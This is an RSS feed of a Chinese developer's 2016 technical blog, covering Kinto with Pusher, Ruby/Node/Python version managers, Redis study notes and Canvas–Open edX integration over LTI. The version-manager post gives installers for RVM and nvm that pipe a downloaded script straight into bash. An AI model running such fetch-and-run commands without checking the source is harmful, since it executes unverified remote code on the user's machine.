  &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;script&lt;/span&gt; &lt;span class="nx"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;https://js.pusher.com/3.1/pusher.min.js&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="err"&gt;/script&amp;gt;&lt;/span&gt;
  &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;script&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;

    &lt;span class="c1"&gt;// Enable pusher logging - don&amp;#39;t include this in production&lt;/span&gt;
    &lt;span class="nx"&gt;Pusher&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;logToConsole&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;pusher&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;Pusher&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;765ec374ae0a69f4ce44&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;wsHost&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;127.0.0.1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nx"&gt;wsPort&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;8080&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nx"&gt;wssPort&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;8080&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nx"&gt;enabledTransports&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ws&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;flash&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
  &lt;span class="p"&gt;});&lt;/span&gt;

    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;channel&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;pusher&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;subscribe&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;test_channel&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;channel&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;bind&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;my_event&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="nx"&gt;alert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;message&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;});&lt;/span&gt;
  &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="err"&gt;/script&amp;gt;&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="err"&gt;/head&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;更多细节参考pusher的文档，需要注意的是需要替换Host&lt;/p&gt;
&lt;h3&gt;&lt;a href="https://github.com/Kinto/kinto/wiki/App-examples"&gt;App-examples&lt;/a&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/Kinto/kinto-attachment/"&gt;kinto-attachment&lt;/a&gt;：文件存储&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Kinto/kinto-admin"&gt;kinto-admin&lt;/a&gt;:是一个前端界面，可以对接任何kinto后端，用户凭证是安全的,需要https,无法使用http的server,可以直接把官方服务保存到本地即可用http&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/leplatrem/kinto-telegram-wall"&gt;kinto-telegram-wall&lt;/a&gt;：消息墙，这是用es6写的一个项目（chrome运行正常，用到了Fetch替代ajax）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;permissions&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://kinto.readthedocs.io/en/latest/tutorials/permissions.html"&gt;Step by step permissions API tutorial&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;Custom authentication&lt;/h3&gt;
&lt;p&gt;kinto是认证后端可插拔的&lt;/p&gt;
&lt;p&gt;&lt;a href="http://kinto.readthedocs.io/en/latest/tutorials/authentication-github.html"&gt;authentication-github&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;拓展功能&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://kinto.readthedocs.io/en/stable/tutorials/write-plugin.html"&gt;How to write a Kinto plugin&lt;/a&gt;：增加搜索功能&lt;/p&gt;
&lt;h1&gt;附&lt;/h1&gt;
&lt;h3&gt;其他的BaaS&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.firebase.com/"&gt;firebase&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ithome.com.tw/news/106045"&gt;新版Firebase來了！Google要為App開發者打造一套萬用雲端後臺&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://parse.com"&gt;parse&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/ParsePlatform/Parse-Server"&gt;Parse-Server&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://parse.com/docs"&gt;docs&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/ParsePlatform/Parse-Server#parse-server--express"&gt;Parse Server + Express&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/ParsePlatform/Parse-Server#basic-options"&gt;Basic options&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/ArnaudValensi/docker-parse-server-git-deploy"&gt;docker-parse-server-git-deploy&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/yongjhih/docker-parse-server"&gt;docker-parse-server&lt;/a&gt;:使用docker-compose，更新活跃&lt;ul&gt;
&lt;li&gt;直接部署到aws上比较简单&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;上述两者都带有各个平台的SDK，相较kinto，功能完备&lt;/p&gt;
&lt;h3&gt;我的建议&lt;/h3&gt;
&lt;p&gt;开发时候，使用云服务，选择不封锁数据的云平台（保障便捷的同时确保可以掌握自己的数据），如果有自行部署的需求，不妨等产品形态定型后再迁移&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 31 May 2016 00:00:00 +0000</pubDate><guid>tag:,2016-05-31:kinto-note-05-31.html</guid><category>tools</category></item><item><title>Ruby/Nodejs解释器版本依赖笔记</title><link>/language-version.html</link><description>&lt;h1&gt;缘起&lt;/h1&gt;
&lt;p&gt;最近在折腾一个项目，对Ruby/Nodejs的版本有要求&lt;/p&gt;
&lt;h1&gt;版本目标&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;ruby --version // ruby 2.2.3&lt;/li&gt;
&lt;li&gt;node --version // v0.12.4&lt;/li&gt;
&lt;li&gt;npm --version  // 2.10.1&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;系统环境&lt;/h1&gt;
&lt;p&gt;Ubuntu14.04&lt;/p&gt;
&lt;h1&gt;Ruby&lt;/h1&gt;
&lt;h2&gt;RVM&lt;/h2&gt;
&lt;p&gt;采用&lt;a href="https://rvm.io/"&gt;RVM&lt;/a&gt;来管理Ruby版本，当然也可以使用&lt;a href="https://github.com/rbenv/rbenv"&gt;rbenv&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;Ubuntu&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gpg --keyserver hkp://keys.gnupg.net --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3
curl -sSL https://get.rvm.io &lt;span class="p"&gt;|&lt;/span&gt; bash -s stable
&lt;span class="nb"&gt;source&lt;/span&gt; /home/ubuntu/.rvm/scripts/rvm
rvm install 2.2.3
rvm use 2.2.3 —default
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Nodejs&lt;/h1&gt;
&lt;h2&gt;update nodejs&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo add-apt-repository ppa:chris-lea/node.js
sudo apt-get update
sudo apt-get install nodejs
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;NVM&lt;/h2&gt;
&lt;p&gt;采用&lt;a href="https://github.com/creationix/nvm"&gt;NVM&lt;/a&gt;来管理Nodejs版本&lt;/p&gt;
&lt;h3&gt;Ubuntu&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.31.0/install.sh &lt;span class="p"&gt;|&lt;/span&gt; bash
nvm install 0.12.4
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;mac&lt;/h3&gt;
&lt;p&gt;brew install nvm&lt;/p&gt;
&lt;p&gt;fish使用：https://github.com/Alex7Kom/nvm-fish&lt;/p&gt;
&lt;h3&gt;使用&lt;/h3&gt;
&lt;p&gt;nvm install v4.2
nvm use V4.2&lt;/p&gt;
&lt;h1&gt;Python&lt;/h1&gt;
&lt;h3&gt;pyenv&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://github.com/yyuu/pyenv"&gt;pyenv&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;brew install pyenv&lt;/li&gt;
&lt;li&gt;pyenv install 2.7.11&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在fish下需要在 .config/fish/config.fish添加:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;setenv PATH &amp;quot;$HOME/.pyenv/bin&amp;quot; $PATH
eval (pyenv init - fish)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;ps:我的vim比较奇怪，需要在system版本的python下才正常，有时为了用ssl需要2.7.10以上的版本的python，所以策略是采用pyenv local 2.7.11,临时变更版本&lt;/p&gt;
&lt;h3&gt;手动&lt;/h3&gt;
&lt;p&gt;我们顺便也把python的依赖记录下，一般来说，python一般版本只区分2/3，所以直接用系统包管理来装就行，注意区分pip2/pip3就好&lt;/p&gt;
&lt;h3&gt;virtualenv&lt;/h3&gt;
&lt;p&gt;使用-p参数指定python版本&lt;/p&gt;
&lt;p&gt;virtualenv -p /usr/local/bin/python3 testenv3&lt;/p&gt;
&lt;h4&gt;ubuntu下安装&lt;/h4&gt;
&lt;p&gt;参考&lt;a href="https://github.com/yyuu/pyenv-installer"&gt;pyenv-installer&lt;/a&gt;,最后需要:&lt;code&gt;source ~/.bashrc&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果遇到requests的ssl问题，建议使用python2.7.11或以上&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;python -c &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;import ssl&lt;span class="p"&gt;;&lt;/span&gt; print&lt;span class="o"&gt;(&lt;/span&gt;ssl.OPENSSL_VERSION&lt;span class="o"&gt;)&lt;/span&gt;’
&lt;span class="c1"&gt;# OpenSSL 1.0.2h  3 May 2016  才正常&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 30 May 2016 00:00:00 +0000</pubDate><guid>tag:,2016-05-30:language-version.html</guid><category>tools</category></item><item><title>redis学习笔记</title><link>/learn-redis.html</link><description>&lt;h1&gt;动机&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;构建消息系统&lt;/li&gt;
&lt;li&gt;构建IM&lt;/li&gt;
&lt;li&gt;学习用缓存加速web应用&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;资源&lt;/h1&gt;
&lt;h3&gt;入门文章&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.jianshu.com/p/01b37cdb3f33"&gt;告诉你Redis是一个牛逼货&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.wklken.me/posts/2013/10/19/redis-base.html"&gt;REDIS基础笔记&lt;/a&gt;:重点阅读&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.wklken.me/posts/2013/10/19/redis-base.html#_1"&gt;资源链接&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://debugo.com/python-redis/"&gt;使用Python操作Redis&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.nosqlfan.com/html/3537.html"&gt;Redis资料汇总专题&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;经验分享&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.phpchina.com/forum.php?mod=viewthread&amp;amp;tid=229629"&gt;Nginx与Redis解决高并发问题&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.jobbole.com/44629/"&gt;成人网站YouPorn使用Redis之经验谈&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.slideshare.net/huacnlee/rails-app-redis"&gt;Rails App 运用 Redis 构建高性能的实时搜索&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.nosqlfan.com/html/3379.html?ref=rediszt"&gt;节约内存：Instagram的Redis实践&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;因为这个应用根本用不到数据库的update功能，事务功能和关联查询等等牛X功能，所以不必为这些用不到的功能去选择维护一个数据库&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.nosqlfan.com/html/1724.html?ref=rediszt"&gt;用Redis构建访问频率控制模块&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;游戏系统，Redis为其中的评级和统计功能&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;书籍&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/JasonLai256/the-little-redis-book/blob/master/cn/redis.md"&gt;the-little-redis-book&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;表格既复杂又灵活，基于表格的存储和管理，没有多少东西是你不能进行建模的，然而，这种通用性并不是没有缺点。具体来说就是，事情并不是总能达到假设中的简单或者快速&lt;/li&gt;
&lt;li&gt;针对特定类型的问题使用特定的数据结构？我们不就是这样进行编程的吗？&lt;/li&gt;
&lt;li&gt;典型的数据库应用案例是，将一个程序的所有数据组织起来，使之与另一个程序的数据保持独立。&lt;ul&gt;
&lt;li&gt;在Redis里，数据库简单的使用一个数字编号来进行辨认，默认数据库的数字编号是0&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;在大多数情况下，Redis会把值看做是一个字节序列，而不会关注它们实质上是什么。要注意，不同的Redis载体处理序列化会有所不同&lt;/li&gt;
&lt;li&gt;查询：对于Redis而言，关键字就是一切，而值是没有任何意义。更通俗来看就是，Redis不允许你通过值来进行查询&lt;ul&gt;
&lt;li&gt;在我们生活的世界里，数据查询是如此的灵活和强大，而Redis的方式看起来是这么的原始和不高效。Redis不是一种普遍使用（one-size-fits-all）的解决方案&lt;/li&gt;
&lt;li&gt;值可以是任何东西，因为Redis从来不需要去读取或理解它们。这也可以帮助我们理清思路，然后去思考如何在这个新世界里建立模型。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;存储器和持久化：你可以对此进行设置，如果X个关键字已变更，那么每隔Y秒存储数据库一次。&lt;/li&gt;
&lt;li&gt;“今天我们有多少个独立用户访问”是个在Web应用里常见的问题，有一篇精彩的博文，在里面可以看到Spool是如何使用这两个命令有效地解决此问题。对于1.28亿个用户，一部笔记本电脑在不到50毫秒的时间里就给出了答复，而且只用了16MB的存储空间。&lt;/li&gt;
&lt;li&gt;当你理解了那些常用的应用案例后，你将发现Redis对于许多类型的问题&lt;/li&gt;
&lt;li&gt;常数时间复杂度O(1)被认为是最快速的  &lt;ul&gt;
&lt;li&gt;许多Redis命令都具有O(1)的时间复杂度&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;对数时间复杂度O(log(N))被认为是第二快速的&lt;ul&gt;
&lt;li&gt;zadd&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;线性时间复杂度O(N)&lt;ul&gt;
&lt;li&gt;在一个表格的非索引列里进行查找就需要O(N)次操作。ltrim命令具有O(N)的时间复杂度&lt;ul&gt;
&lt;li&gt;N不是列表所拥有的元素数量，而是被删除的元素数量&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;在Redis里，当我们发现一些操作具有O(N)的时间复杂度时，我们可能可以找到更为好的方法去处理&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/JasonLai256/the-little-redis-book/blob/master/cn/redis.md#仿多关键字查询pseudo-multi-key-queries"&gt;仿多关键字查询&lt;/a&gt;:很受启发&lt;/li&gt;
&lt;li&gt;性能或存储空间等问题，经过测试后，才会有真正的理解&lt;/li&gt;
&lt;li&gt;Redis命令都具有原子性，Redis实际上是单线程运行的&lt;ul&gt;
&lt;li&gt;使用multi运行具有原子性的一组命令，执行exec命令去实际执行命令，使用discard命令放弃执行命令&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;关键是要理解基本的数据结构。你将能领悟到，这些数据结构是如何能够实现你最初视角之外的东西。&lt;/li&gt;
&lt;li&gt;使用期限（Expiration）：让Redis能成为一个理想的缓冲引擎&lt;/li&gt;
&lt;li&gt;发布和订阅：一流支持&lt;/li&gt;
&lt;li&gt;sort命令是Redis最强大的命令之一&lt;/li&gt;
&lt;li&gt;复制：当你向一个Redis实例（Master）进行写入时，一个或多个其他实例（Slaves）能通过Master实例来保持更新&lt;/li&gt;
&lt;li&gt;备份文件：Redis会把快照存储为一个名为dump.rdb的文件&lt;/li&gt;
&lt;li&gt;复制功能（Replication）是一个成长中的网站可以利用的第一个工具。有一些命令会比另外一些来的昂贵（例如sort命令），将这些运行载荷转移到一个Slave实例里，可以保持整体系统对于查询的快速响应。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;生产使用&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/wandoulabs/codis"&gt;codis&lt;/a&gt;:Codis 是一个分布式 Redis 解决方案, 对于上层的应用来说, 连接到 Codis Proxy 和连接原生的 Redis Server 没有明显的区别, 上层应用可以像使用单机的 Redis一样使用. 可以简单的认为后边连接的是一个内存无限大的 Redis 服务.&lt;/li&gt;
&lt;li&gt;&lt;a href="http://dockone.io/article/180"&gt;用Docker构建分布式Redis集群&lt;/a&gt;:十分简单&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/andymccurdy/redis-py"&gt;redis-py&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/steelThread/redmon"&gt;redmon&lt;/a&gt;:性能监控&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.nosqlfan.com/html/3644.html"&gt;redmon：Redis监控管理Web工具&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/ErikDubbelboer/phpRedisAdmin"&gt;phpRedisAdmin&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;性能测试：&lt;a href="http://www.runoob.com/redis/redis-benchmarks.html"&gt;Redis 性能测试&lt;/a&gt;，采用redis-benchmark&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/facebookarchive/redis-faina"&gt;统计分析&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/monterail/redis-browser"&gt;redis-browser&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;http://127.0.0.1:4567/&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/JoneXiong/PyRedisAdmin"&gt;PyRedisAdmin&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;论坛&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.redis.cn/"&gt;redis.cn&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;文档&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://redisdoc.com/"&gt;Redis 命令参考&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;练习&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://try.redis.io/"&gt;try.redis.io&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/rolando/scrapy-redis"&gt;scrapy-redis&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/gnemoug/distribute_crawler"&gt;distribute_crawler&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;我的理解&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;redis是个类似数据库的东西，支持更丰富的数据结构，更少的约束&lt;/li&gt;
&lt;li&gt;如何将这些数据结构用于典型案例，捷径是一边理解redis的数据结构一遍看别人的案例&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 26 May 2016 00:00:00 +0000</pubDate><guid>tag:,2016-05-26:learn-redis.html</guid><category>tools</category></item><item><title>整合canvas lms和Open edX</title><link>/canvas-and-Open-edx.html</link><description>&lt;h1&gt;canvas lms是什么&lt;/h1&gt;
&lt;p&gt;Canvas被Black Duck标榜为"唯一的一款商业开源学习管理系统，而且是唯一的一款部署在云端的学习管理系统LMS"&lt;/p&gt;
&lt;p&gt;Black Duck又是什么，如果你关注开源软件，想必对Black Duck也很熟悉了&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Black Duck Software helps the world's most innovative companies streamline, safeguard, and manage their use of open source software.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Black Duck对开源软件的评价还是相对靠谱的&lt;/p&gt;
&lt;p&gt;Canvas的确是一款优秀的lms，界面美观/功能完备/丰富的API，尤其适合校内教学使用，有班级/小组/学期的概念&lt;/p&gt;
&lt;h1&gt;几张截图&lt;/h1&gt;
&lt;h3&gt;教师视角&lt;/h3&gt;
&lt;p&gt;&lt;img alt="canvas_teacher.jpg" src="http://7kttuq.com1.z0.glb.clouddn.com/canvas_teacher.jpg" /&gt;&lt;/p&gt;
&lt;h3&gt;学生视角&lt;/h3&gt;
&lt;p&gt;&lt;img alt="student.png" src="http://7kttuq.com1.z0.glb.clouddn.com/student.png" /&gt;&lt;/p&gt;
&lt;h1&gt;功能/特色&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;支持多种认证&lt;ul&gt;
&lt;li&gt;cas&lt;/li&gt;
&lt;li&gt;oauth2&lt;/li&gt;
&lt;li&gt;and so on&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;支持LTI 2&lt;/li&gt;
&lt;li&gt;Open api(RESTful)&lt;/li&gt;
&lt;li&gt;国际化&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;课程主体&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;主页&lt;/li&gt;
&lt;li&gt;通告 &lt;/li&gt;
&lt;li&gt;作业 &lt;/li&gt;
&lt;li&gt;讨论&lt;/li&gt;
&lt;li&gt;评分&lt;/li&gt;
&lt;li&gt;人员&lt;/li&gt;
&lt;li&gt;页面&lt;/li&gt;
&lt;li&gt;文件&lt;/li&gt;
&lt;li&gt;大纲&lt;/li&gt;
&lt;li&gt;成果 &lt;/li&gt;
&lt;li&gt;测验 &lt;/li&gt;
&lt;li&gt;单元 &lt;/li&gt;
&lt;li&gt;设置&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;online and on-campus&lt;/h1&gt;
&lt;p&gt;学校可能有这样一种需求，既需要针对校内的教学，由想有自己的online平台，这两种教学场景天生有其不同的地方，很难靠一套系统来满足，校内教学可能需要教学辅助的功能，需要有对学习资料的管理，需要有班级/学期的概念，需要更多的师生交流&lt;/p&gt;
&lt;p&gt;canvas是解决这个问题的绝佳工具，可能是目前最好的工具&lt;/p&gt;
&lt;p&gt;而online的平台，更多的是mooc的概念，风格上更偏向互联网，架构上优先考虑高并发，所以设计上自然是分布式的&lt;/p&gt;
&lt;p&gt;而由于考虑到一个课堂容纳的众多人数，online的系统设计上不会考虑丰富的教/学互动，诸如主观题在Open edx中并不存在，除非使用AI，否则教师没有经历对每个学生的答案进行人工点评&lt;/p&gt;
&lt;p&gt;online and on-campus需求的不同，以至于我们很难拓展一个系统来满足两种需求，如果你试图这样做，打造出来的"大而全"工具，可能会显得臃肿而不够灵活，更好的选择，是选两个独立的工具，每一个do one thing and do it
 well，那么如何打通两者，使课程内容能在两者中流通，就是问题的关键了&lt;/p&gt;
&lt;h1&gt;先例&lt;/h1&gt;
&lt;p&gt;哈弗大学遇到过这个问题，他们将Open edX用作online系统，而将canvas用作针对校内的on-campus系统，之后试图在这两者中共享资源&lt;/p&gt;
&lt;h1&gt;哈佛的做法&lt;/h1&gt;
&lt;h3&gt;LTI provider and consumer&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Open edx同时作为LTI provider and consumer&lt;/li&gt;
&lt;li&gt;Canvas 以及其他的系统作为LTI consumer&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;需要注意的是Canvas支持LTI2，而Open edx只支持LTI1.1&lt;/p&gt;
&lt;h1&gt;学习记录&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;单点登录&lt;/li&gt;
&lt;li&gt;资源呈现：只呈现资源内容&lt;/li&gt;
&lt;li&gt;成绩： 使用LTI 1.1来传递得分情况&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;整合案例&lt;/h1&gt;
&lt;p&gt;以下是我的整合案例
首先为Open edX做好LTI相关的配置，记得同步数据库&lt;/p&gt;
&lt;p&gt;接着到admin中生成consumer key&lt;/p&gt;
&lt;p&gt;之后我们在Open edx的studio中创建一门课程资源&lt;/p&gt;
&lt;p&gt;&lt;img alt="canvas_edx" src="http://7kttuq.com1.z0.glb.clouddn.com/canvas_edx.png" /&gt;&lt;/p&gt;
&lt;p&gt;取得课程的资源，拼凑为适合分享的连接，将连接粘贴到canvas中即可&lt;/p&gt;
&lt;p&gt;&lt;img alt="edx2canvas1" src="http://7kttuq.com1.z0.glb.clouddn.com/edx2canvas1.png" /&gt;&lt;/p&gt;
&lt;p&gt;我们就可以在canvas中做任何能在Open edx中做的操作&lt;/p&gt;
&lt;p&gt;&lt;img alt="edx2canvas2" src="http://7kttuq.com1.z0.glb.clouddn.com/edx2canvas2.png" /&gt;&lt;/p&gt;
&lt;p&gt;下面是讨论&lt;/p&gt;
&lt;p&gt;&lt;img alt="edx2canvas3" src="http://7kttuq.com1.z0.glb.clouddn.com/edx2canvas3.png" /&gt;&lt;/p&gt;
&lt;h1&gt;后记&lt;/h1&gt;
&lt;p&gt;用同样的方式，我们可以把Open edX的资源整合到任何支持LTI协议的系统中&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 24 May 2016 00:00:00 +0000</pubDate><guid>tag:,2016-05-24:canvas-and-Open-edx.html</guid><category>edx</category></item><item><title>Open edx笔记系统探究</title><link>/open-edx-note-system.html</link><description>&lt;p&gt;edx笔记系统是很有意思的一个话题&lt;/p&gt;
&lt;h1&gt;架构&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;前端&lt;/li&gt;
&lt;li&gt;后端&lt;/li&gt;
&lt;li&gt;通信方式：RESTful接口&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;由此可知笔记可以作为一项服务&lt;/p&gt;
&lt;h1&gt;前端&lt;/h1&gt;
&lt;h3&gt;笔记库：annotator&lt;/h3&gt;
